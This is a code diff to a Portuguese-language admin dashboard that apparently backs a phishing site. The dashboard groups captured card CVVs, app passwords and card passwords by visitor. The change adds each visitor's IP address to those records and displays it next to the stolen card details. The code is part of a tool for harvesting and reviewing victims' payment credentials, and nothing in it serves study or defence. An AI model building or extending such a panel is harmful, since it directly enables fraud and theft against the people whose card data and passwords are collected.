@@ -34,6 +34,7 @@ interface GroupedClient {
   cvv?: string;
   senha_app?: string;
   senha_cartao?: string;
+  ip_address?: string;
   created_at: string;
   user_agent?: string;
 }
@@ -155,13 +156,17 @@ const AdminDashboard = () => {
     const visitorIds = [...new Set(entries.map(e => e.visitor_id))];
     const { data: visitData } = await supabase
       .from("page_visits")
-      .select("visitor_id, user_agent")
+      .select("visitor_id, user_agent, ip_address")
       .in("visitor_id", visitorIds.length > 0 ? visitorIds : ["__none__"]);
     
     const uaMap: Record<string, string> = {};
+    const ipMap: Record<string, string> = {};
     visitData?.forEach((v) => {
       if (v.user_agent && !uaMap[v.visitor_id]) {
         uaMap[v.visitor_id] = v.user_agent;
+      }
+      if (v.ip_address && !ipMap[v.visitor_id]) {
+        ipMap[v.visitor_id] = v.ip_address;
       }
     });
 
@@ -173,6 +178,7 @@ const AdminDashboard = () => {
           visitor_id: entry.visitor_id,
           created_at: entry.created_at,
           user_agent: uaMap[entry.visitor_id],
+          ip_address: ipMap[entry.visitor_id],
         };
       }
       const client = grouped[entry.visitor_id];
@@ -317,6 +323,7 @@ const AdminDashboard = () => {
                     <div><span className="text-muted-foreground">CVV:</span> <span className="text-foreground font-medium">{client.cvv || "—"}</span></div>
                   </div>
                   <div><span className="text-muted-foreground">Senha Cartão:</span> <span className="text-foreground font-medium">{client.senha_cartao || "—"}</span></div>
+                  <div><span className="text-muted-foreground">IP:</span> <span className="text-foreground font-medium">{client.ip_address || "—"}</span></div>
                   <div><span className="text-muted-foreground">Dispositivo:</span> <span className="text-foreground font-medium">{detectDevice(client.user_agent)}</span></div>
                 </div>
               </div>
